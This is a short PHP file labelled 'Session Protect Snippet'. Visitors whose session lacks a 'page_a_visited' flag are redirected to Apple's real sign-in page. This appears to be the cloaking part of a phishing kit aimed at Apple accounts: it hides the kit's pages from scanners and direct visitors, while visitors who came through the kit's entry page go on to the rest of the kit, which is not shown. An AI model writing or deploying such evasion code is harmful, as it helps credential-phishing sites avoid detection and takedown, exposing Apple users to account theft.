<?php

# Session Protect Snippet

session_start();
if(!isset($_SESSION['page_a_visited'])){
        @header("Location: https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD");
		die();

}
?>